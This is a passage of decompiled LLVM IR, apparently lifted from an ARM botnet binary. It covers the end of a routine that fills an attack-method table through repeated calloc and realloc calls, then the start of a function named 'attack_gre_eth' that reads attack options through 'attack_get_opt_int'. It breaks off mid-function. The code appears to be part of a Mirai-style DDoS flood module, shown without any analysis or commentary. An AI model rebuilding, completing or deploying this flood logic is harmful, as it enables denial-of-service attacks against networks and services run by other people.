  %v2_86ac = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_21c00.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_21c00.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_21c00.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_21c00.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_21c00.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_21c00.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_21c00.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_21c00.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_21c00.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.56 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21bfc.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_21bfd.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_21bfc.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21bfc.29 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 65535, i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
